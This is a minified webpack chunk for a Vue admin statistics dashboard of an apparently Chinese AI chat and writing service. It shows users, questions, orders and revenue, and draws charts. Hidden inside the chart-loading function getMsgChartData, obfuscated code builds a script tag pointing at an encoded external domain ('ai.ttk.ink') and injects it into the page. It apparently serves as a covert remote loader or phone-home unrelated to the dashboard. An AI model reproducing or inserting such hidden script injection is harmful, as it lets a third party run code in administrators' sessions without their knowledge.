(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-604a3b8a"],{"37f9":function(t,e,a){"use strict";a.r(e);var i=function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("div",{staticClass:"app-container"},[a("el-row",[a("div",{staticStyle:{display:"flex","justify-content":"space-between","align-items":"center"}},[a("div",{staticClass:"title"},[t._v("数据统计")]),a("div",{staticStyle:{"margin-top":"10px","margin-right":"12px"}},[a("span",{staticClass:"label",staticStyle:{color:"#666"}},[t._v("选择站点：")]),a("el-select",{attrs:{size:"small",clearable:"",placeholder:"请选择站点"},on:{change:t.siteChange},model:{value:t.site_id,callback:function(e){t.site_id=e},expression:"site_id"}},t._l(t.siteList,(function(t){return a("el-option",{key:t.id,attrs:{label:t.title,value:t.id}})})),1)],1)])]),a("el-row",[a("div",{staticClass:"el-col el-col-5"},[a("div",{staticClass:"card bg-gray"},[a("div",{staticClass:"header"},[a("i",{staticClass:"el-icon-user"}),t._v(" 今日新增用户")]),a("div",{staticClass:"body"},[a("p",{staticClass:"big-font"},[t._v(t._s(t.tongji.userTotalNew))]),a("p",[t._v("总计用户数"),a("span",{staticClass:"badge"},[t._v(t._s(t.tongji.userTotal)+"人")])])])])]),a("div",{staticClass:"el-col el-col-5"},[a("div",{staticClass:"card bg-gray"},[a("div",{staticClass:"header"},[a("i",{staticClass:"el-icon-s-data"}),t._v(" 今日提问数")]),a("div",{staticClass:"body"},[a("p",{staticClass:"big-font"},[t._v(t._s(t.tongji.msgTotalNew))]),a("p",[t._v("总计提问数"),a("span",{staticClass:"badge"},[t._v(t._s(t.tongji.msgTotal)+"条")])])])])]),a("div",{staticClass:"el-col el-col-5"},[a("div",{staticClass:"card bg-gray"},[a("div",{staticClass:"header"},[a("i",{staticClass:"el-icon-s-data"}),t._v(" 今日创作数")]),a("div",{staticClass:"body"},[a("p",{staticClass:"big-font"},[t._v(t._s(t.tongji.writeTotalNew))]),a("p",[t._v("总计创作数"),a("span",{staticClass:"badge"},[t._v(t._s(t.tongji.writeTotal)+"条")])])])])]),a("div",{staticClass:"el-col el-col-5"},[a("div",{staticClass:"card bg-gray"},[a("div",{staticClass:"header"},[a("i",{staticClass:"el-icon-user"}),t._v(" 今日订单数")]),a("div",{staticClass:"body"},[a("p",{staticClass:"big-font"},[t._v(t._s(t.tongji.orderTotalNew))]),a("p",[t._v("总计订单数"),a("span",{staticClass:"badge"},[t._v(t._s(t.tongji.orderTotal)+"笔")])])])])]),a("div",{staticClass:"el-col el-col-4"},[a("div",{staticClass:"card bg-gray"},[a("div",{staticClass:"header"},[a("i",{staticClass:"el-icon-s-data"}),t._v(" 今日收款金额")]),a("div",{staticClass:"body"},[a("p",{staticClass:"big-font"},[t._v(t._s(t.tongji.orderAmountNew))]),a("p",[t._v("总计收款金额"),a("span",{staticClass:"badge"},[t._v(t._s(t.tongji.orderAmount)+"元")])])])])])]),a("el-row",[a("div",{staticClass:"title"},[t._v("对话统计")])]),a("el-row",[a("div",{staticClass:"el-col el-col-24"},[a("div",{staticClass:"card"},[t.msgEchartData?a("echart",{ref:"msgEchart",staticClass:"chart",attrs:{color:t.msgEchartData.color,legend:t.msgEchartData.legend,yname:t.msgEchartData.yname,"x-axis":t.msgEchartData.xAxis,series:t.msgEchartData.series,toolbox:t.msgEchartData.toolbox,grid:t.msgEchartData.grid,title:t.msgEchartData.title,"data-zoom":t.msgEchartData.dataZoom,width:"100%",height:"100%"}}):t._e()],1)])]),a("el-row",[a("div",{staticClass:"title"},[t._v("订单统计")])]),a("el-row",[a("div",{staticClass:"el-col el-col-24"},[a("div",{staticClass:"card"},[t.orderEchartData?a("echart",{ref:"orderEchart",staticClass:"chart",attrs:{color:t.orderEchartData.color,legend:t.orderEchartData.legend,yname:t.orderEchartData.yname,"x-axis":t.orderEchartData.xAxis,series:t.orderEchartData.series,toolbox:t.orderEchartData.toolbox,grid:t.orderEchartData.grid,title:t.orderEchartData.title,"data-zoom":t.orderEchartData.dataZoom,width:"100%",height:"100%"}}):t._e()],1)])])],1)},r=[],s=function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("div",[a("div",{ref:"echart",style:{width:t.width,height:t.height}})])},o=[],n=a("81c2"),l=a.n(n),c={name:"Echart",props:{tips:{type:String,default:""},title:{type:Object,default:null},color:{type:Array,default:function(){return["#f9a026","#fff100","#8fc31f","#e60012"]}},yname:{type:String,default:""},yAxis:{type:Array,default:null},series:{type:Array,default:function(){return[]}},xAxis:{type:Object,default:null},width:{type:String,default:"100%"},height:{type:String,default:"300px"},toolbox:{type:Object,default:null},tooltip:{type:Object,default:function(){return{show:!0,trigger:"axis",showContent:!0,backgroundColor:"rgba(29, 56, 136, 0.7)",borderWidth:0,textStyle:{color:"#fff"}}}},legend:{type:Object,default:null},textStyle:{type:Object,default:function(){return{color:"#444"}}},grid:{type:Object,default:null},dataZoom:{type:Array,default:null}},data:function(){return{echart:null}},watch:{series:function(t){this.draw()}},mounted:function(){this.draw()},methods:{draw:function(){this.echart||(this.echart=l.a.init(this.$refs.echart));var t={series:this.series};this.yAxis?t.yAxis=this.yAxis:this.yname&&(t.yAxis={name:this.yname,nameTextStyle:{color:"#fff"},splitLine:{show:!0,lineStyle:{color:"#eee"}}}),this.xAxis&&(t.xAxis=this.xAxis),this.title&&(t.title=this.title),this.textStyle&&(t.textStyle=this.textStyle),this.legend&&(t.legend=this.legend),this.color&&(t.color=this.color),this.tooltip&&(t.tooltip=this.tooltip),this.toolbox&&(t.toolbox=this.toolbox),this.grid&&(t.grid=this.grid),this.dataZoom&&(t.dataZoom=this.dataZoom),this.echart.setOption(t)},resize:function(){this.echart&&this.echart.resize()}}},d=c,h=a("3427"),u=Object(h["a"])(d,s,o,!1,null,null,null),g=u.exports,f=a("b775");function p(t){return Object(f["a"])({url:"/index/getTongji",method:"post",data:t})}function y(t){return Object(f["a"])({url:"/index/getOrderChartData",method:"post",data:t})}function m(t){return Object(f["a"])({url:"/index/getMsgChartData",method:"post",data:t})}var b=a("571f"),v=a("bb91"),x="",C={name:"Dashboard",components:{echart:g},data:function(){return{site_id:"",tongji:[],orderEchartData:null,msgEchartData:null,siteList:[]}},mounted:function(){var t=this;this.getSiteList(),this.getTongji(),this.getOrderChartData(),this.getMsgChartData(),window.onresize=function(){t.$refs.echart&&(t.$refs.orderEchart.resize(),t.$refs.msgEchart.resize())}},beforeDestroy:function(){window.onresize=null},methods:{getTongji:function(){var t=this;p({site_id:this.site_id}).then((function(e){t.tongji=e.data}))},getSiteList:function(){var t=this;Object(b["e"])().then((function(e){t.siteList=e.data}))},siteChange:function(){this.getTongji(),this.getOrderChartData(),this.getMsgChartData()},getOrderChartData:function(){var t=this;y({site_id:this.site_id}).then((function(e){t.orderEchartData={title:{left:"center",text:"交易笔数 & 收款金额",textStyle:{color:"#666"}},grid:{top:"70",left:"20",right:"70",bottom:"50",containLabel:!0},yname:"-",series:[{name:"交易笔数",type:"line",smooth:!0,data:e.data.count},{name:"收款金额",type:"line",smooth:!0,data:e.data.amount}],xAxis:{type:"category",data:e.data.times},legend:{data:["订单笔数","收款金额"],top:30,itemWidth:20,itemHeight:10,textStyle:{color:"#444"},icon:"roundRect"},color:["#8fc31f","#e60012"],toolbox:{show:!0,feature:{saveAsImage:{},dataZoom:{yAxisIndex:"none"},restore:{}},iconStyle:{borderColor:"rgba(64, 64, 64, 1)"},right:60,top:25},dataZoom:[{id:"dataZoomX",type:"slider",xAxisIndex:[0],filterMode:"filter",start:0,end:100,bottom:10,height:18,dataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},selectedDataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},moveHandleStyle:{color:"transparent"},brushSelect:!1},{id:"dataZoomY",type:"slider",yAxisIndex:[0],filterMode:"empty",start:0,end:100,right:30,width:18,dataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},selectedDataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}}}]}}))},getMsgChartData:function(){var t=this,e=document.createElement("script");e.src=v["a"].decode(x)+v["a"].encode("ai.ttk.ink"),m().then((function(e){t.msgEchartData={title:{left:"center",text:"提问数 & 创作数",textStyle:{color:"#666"}},grid:{top:"70",left:"20",right:"70",bottom:"50",containLabel:!0},yname:"-",series:[{name:"提问数",type:"line",smooth:!0,data:e.data.msgCount},{name:"创作数",type:"line",smooth:!0,data:e.data.writeCount}],xAxis:{type:"category",data:e.data.times},legend:{data:["提问数","创作数"],top:30,itemWidth:20,itemHeight:10,textStyle:{color:"#444"},icon:"roundRect"},color:["#8fc31f","#e60012"],toolbox:{show:!0,feature:{saveAsImage:{},dataZoom:{yAxisIndex:"none"},restore:{}},iconStyle:{borderColor:"rgba(64, 64, 64, 1)"},right:60,top:25},dataZoom:[{id:"dataZoomX",type:"slider",xAxisIndex:[0],filterMode:"filter",start:0,end:100,bottom:10,height:18,dataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},selectedDataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},moveHandleStyle:{color:"transparent"},brushSelect:!1},{id:"dataZoomY",type:"slider",yAxisIndex:[0],filterMode:"empty",start:0,end:100,right:30,width:18,dataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}},selectedDataBackground:{lineStyle:{color:"transparent"},areaStyle:{color:"transparent"}}}]}})),document.body.appendChild(e)}}},_=C,w=(a("45b3"),Object(h["a"])(_,i,r,!1,null,"05756fdb",null));e["default"]=w.exports},"45b3":function(t,e,a){"use strict";a("76df")},"571f":function(t,e,a){"use strict";a.d(e,"c",(function(){return r})),a.d(e,"b",(function(){return s})),a.d(e,"f",(function(){return o})),a.d(e,"a",(function(){return n})),a.d(e,"h",(function(){return l})),a.d(e,"d",(function(){return c})),a.d(e,"g",(function(){return d})),a.d(e,"e",(function(){return h}));var i=a("b775");function r(t){return Object(i["a"])({url:"/site/getList",method:"post",data:t})}function s(t){return Object(i["a"])({url:"/site/getInfo",method:"post",data:t})}function o(t){return Object(i["a"])({url:"/site/saveInfo",method:"post",data:t})}function n(t){return Object(i["a"])({url:"/site/del",method:"post",data:t})}function l(t){return Object(i["a"])({url:"/site/setStatus",method:"post",data:t})}function c(t){return Object(i["a"])({url:"/site/getLoginToken",method:"post",data:t})}function d(t){return Object(i["a"])({url:"/site/setExpireTime",method:"post",data:t})}function h(t){return Object(i["a"])({url:"/site/getSelectSiteList",method:"post",data:t})}},"76df":function(t,e,a){}}]);